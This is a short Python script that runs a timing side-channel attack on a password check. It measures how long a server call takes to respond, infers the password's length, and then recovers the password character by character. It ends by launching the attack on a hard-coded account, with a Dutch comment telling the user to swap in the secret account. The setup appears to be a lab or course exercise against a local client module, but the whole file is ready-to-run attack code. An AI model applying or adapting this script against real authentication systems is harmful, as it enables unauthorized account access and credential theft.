import time
import statistics
import string
from Client import call_server

alphabet = string.ascii_lowercase + string.digits


def measure_time(username, password, variance=0.002):

    medians = []

    for _ in range(5):

        times = []

        for _ in range(20):

            start = time.perf_counter()

            call_server(username, password, variance)

            end = time.perf_counter()

            times.append(end - start)

        medians.append(statistics.median(times))

    return statistics.mean(medians)


def find_password_length(username):

    results = {}

    print("\nDetecting password length...\n")

    for length in range(1, 20):

        guess = "a" * length

        t = measure_time(username, guess)

        results[length] = t

        print("Length", length, "Time", t)

    best_length = max(results, key=results.get)

    print("\nDetected password length:", best_length)

    return best_length


def crack_password(username, length):

    password = ""

    print("\nStarting timing attack...\n")

    for position in range(length):

        best_char = None
        best_time = 0

        for char in alphabet:

            guess = password + char

            guess = guess.ljust(length, "a")

            t = measure_time(username, guess)

            if t > best_time:
                best_time = t
                best_char = char

        password += best_char

        print("Found so far:", password)

    return password


def verify_password(username, password):

    print("\nVerifying password...\n")

    response = call_server(username, password)

    print("Server response:", response)


def attack(username):

    length = find_password_length(username)

    password = crack_password(username, length)

    print("\nRecovered password:", password)

    verify_password(username, password)


# -------- RUN ATTACK --------

target_user = "000000"   # verander dit naar het geheime account

attack(target_user)